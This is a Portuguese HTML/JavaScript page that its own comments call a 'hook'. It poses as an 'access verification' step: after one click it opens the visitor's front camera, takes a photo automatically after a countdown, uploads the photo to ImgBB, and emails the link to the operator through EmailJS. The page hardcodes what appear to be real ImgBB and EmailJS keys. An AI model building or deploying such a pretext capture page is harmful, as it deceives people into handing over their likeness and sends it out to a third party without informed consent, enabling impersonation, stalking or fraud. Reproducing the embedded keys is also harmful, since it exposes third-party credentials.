<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura Automática</title>
    
    <!-- Script do EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
       // INICIALIZAÇÃO
       // Substitua pela sua Public Key do EmailJS
       (function(){
           emailjs.init("dE244dq8weZCu5CiA");
       })();
    </script>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #1a1a1a;
            color: white;
        }
        .container {
            text-align: center;
            width: 90%;
            max-width: 500px;
        }
        /* O botão inicial */
        .btn-start {
            background: #007bff;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,123,255,0.4);
            transition: transform 0.2s;
        }
        .btn-start:active { transform: scale(0.95); }

        /* Área da câmera (inicialmente oculta) */
        .camera-view {
            display: none;
            position: relative;
            margin-top: 20px;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            background: #000;
        }
        video {
            width: 100%;
            display: block;
            transform: scaleX(-1); /* Espelha a câmera frontal */
        }
        
        /* Contador visual */
        .countdown {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 80px;
            font-weight: bold;
            color: white;
            text-shadow: 0 0 10px rgba(0,0,0,0.8);
            display: none;
        }

        /* Esconder elementos técnicos */
        canvas { display: none; }

        .status {
            margin-top: 15px;
            font-size: 14px;
            color: #aaa;
            min-height: 20px;
        }
        
        /* Mensagem final */
        .success-msg {
            display: none;
            background: #28a745;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- TELA 1: O GANCHO -->
        <div id="startScreen">
            <h2>Verificação de Acesso</h2>
            <p>Clique abaixo para validar seu acesso e iniciar a verificação.</p>
            <button class="btn-start" id="btnStart">ACEITAR ACESSO</button>
        </div>

        <!-- TELA 2: A CÂMERA -->
        <div id="cameraScreen" class="camera-view">
            <video id="video" autoplay playsinline></video>
            <div class="countdown" id="countdownDisplay">3</div>
            <canvas id="canvas"></canvas>
        </div>

        <!-- TELA 3: SUCESSO -->
        <div id="successScreen" class="success-msg">
            <h3>✅ Verificação Concluída!</h3>
            <p>Sua foto foi enviada com sucesso.</p>
        </div>

        <div class="status" id="statusText"></div>
    </div>

    <script>
        // CONFIGURAÇÕES
        const IMGBB_KEY = '150c23d157fe7a469ffa4316f840df88'; // <--- SUA CHAVE AQUI
        const SERVICE_ID = 'service_1tsipns';      // <--- SEU SERVICE ID
        const TEMPLATE_ID = 'template_38m07j9';    // <--- SEU TEMPLATE ID

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btnStart = document.getElementById('btnStart');
        const startScreen = document.getElementById('startScreen');
        const cameraScreen = document.getElementById('cameraScreen');
        const countdownDisplay = document.getElementById('countdownDisplay');
        const statusText = document.getElementById('statusText');
        const successScreen = document.getElementById('successScreen');

        // 1. Iniciar ao clicar
        btnStart.addEventListener('click', async () => {
            // Esconde o botão e mostra a câmera
            startScreen.style.display = 'none';
            cameraScreen.style.display = 'block';
            statusText.innerText = "Acessando câmera...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
                
                // Assim que o vídeo carregar, começa a contagem
                video.onloadedmetadata = () => {
                    statusText.innerText = "Posicione-se...";
                    startCountdown();
                };

            } catch (err) {
                statusText.innerText = "Erro: " + err.message;
            }
        });

        // 2. Contagem Regressiva Automática
        function startCountdown() {
            let timeLeft = 3;
            countdownDisplay.style.display = 'block';
            countdownDisplay.innerText = timeLeft;

            const timer = setInterval(() => {
                timeLeft--;
                if (timeLeft > 0) {
                    countdownDisplay.innerText = timeLeft;
                } else {
                    clearInterval(timer);
                    countdownDisplay.style.display = 'none';
                    captureAndUpload();
                }
            }, 1000);
        }

        // 3. Captura e Envio Automático
        function captureAndUpload() {
            statusText.innerText = "Tirando foto...";
            
            // Configura canvas
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const file = new File([blob], "auto_foto.jpg", { type: "image/jpeg" });
                const formData = new FormData();
                formData.append("key", IMGBB_KEY);
                formData.append("image", file);

                statusText.innerText = "Enviando para ImgBB...";

                try {
                    // Upload ImgBB
                    const response = await fetch("https://api.imgbb.com/1/upload", {
                        method: "POST",
                        body: formData
                    });
                    
                    const data = await response.json();

                    if (data.success) {
                        const url = data.data.url;
                        statusText.innerText = "Enviando link por e-mail...";

                        // Envia via EmailJS
                        emailjs.send(SERVICE_ID, TEMPLATE_ID, {
                            message: "Autofoto capturada.",
                            photo_link: url
                        })
                        .then(() => {
                            statusText.innerText = "Sucesso!";
                            successScreen.style.display = 'block';
                        })
                        .catch(err => {
                            statusText.innerText = "Foto salva, mas e-mail falhou.";
                            console.log(err);
                            successScreen.style.display = 'block';
                        });
                    }
                } catch (error) {
                    statusText.innerText = "Erro na conexão.";
                }
            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
</html>
